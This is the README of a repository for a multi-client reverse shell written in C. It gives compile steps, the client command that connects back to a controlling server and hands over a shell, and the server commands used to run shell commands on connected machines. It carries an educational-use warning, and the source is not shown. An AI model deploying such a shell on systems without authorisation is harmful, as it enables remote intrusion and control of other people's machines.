# Simple Reverse Shell in C

This repository contains a simple multi-client reverse shell implementation in C, targeting UNIX-based systems. It consists of two programs: a server and a client. The server can manage and interact with multiple connected clients, allowing the execution of shell commands remotely.

## Features

- **Multi-client support:** The server can handle connections from multiple clients simultaneously, each in its own thread.
- **Remote shell execution:** The server can send shell commands to connected clients, and the clients execute the commands and return the results.
- **Directory navigation:** The server can instruct clients to change directories (`cd` command).
- **Broadcast and targeted messaging:** The server can send messages/commands to all clients or a specific client.
- **Client management:** View connected clients, disconnect clients, and monitor client status.
- **Graceful exits:** Both client and server can handle exit commands and client disconnections cleanly.

## Usage

### Compilation

```sh
# Compile the server
g++ server.c -o server -lpthread

# Compile the client
g++ client.c -o client
```

### Running the Server

```sh
./server <IP> <PORT>
```

- Replace `<IP>` with the server's IP address (e.g., `192.168.0.100`)
- Replace `<PORT>` with the desired listening port (e.g., `9001`)

Example:
```sh
./server 192.168.0.100 9001
```

### Running the Client

```sh
./client <SERVER_IP> <SERVER_PORT>
```
- Replace `<SERVER_IP>` and `<SERVER_PORT>` with the address and port of the server.

Example:
```sh
./client 192.168.0.100 9001
```

### Server Commands

- `sendall <message>` — Send a message/command to all connected clients.
- `print clients` — Display a list of connected clients and their indices.
- `send <client index> <message>` — Send a message/command to a specific client.
- `cd <client index> <directory>` — Instruct a specific client to change its working directory.

### Client Behavior

- Receives commands from the server, executes them, and sends the output back.
- Handles `cd` (change directory) and `exit` commands.
- On "exit", disconnects gracefully.

## Example Session

1. Start the server:
    ```sh
    ./server 0.0.0.0 9001
    ```

2. On the client machine, connect:
    ```sh
    ./client <server_ip> 9001
    ```

3. On the server, interact with clients using the commands above.

## Security and Ethical Notice

> **Warning:**  
> This software establishes a reverse shell, which can be used to execute remote commands on connected machines.  
> - **For educational and authorized security testing only.**
> - **Do NOT use against systems you do not own or have explicit permission to test.**
> - Unauthorized use may be illegal and unethical.

## Dependencies

- Standard UNIX C libraries (`stdio.h`, `sys/types.h`, `sys/socket.h`, etc.)
- POSIX threads (`-lpthread` for the server)

## Limitations

- No authentication or encryption: All communication is plaintext and unauthenticated.
- Designed for simple demonstration and educational purposes, not for production use.

## License

This project is licensed for educational and ethical hacking purposes only. See `LICENSE` for details if present.
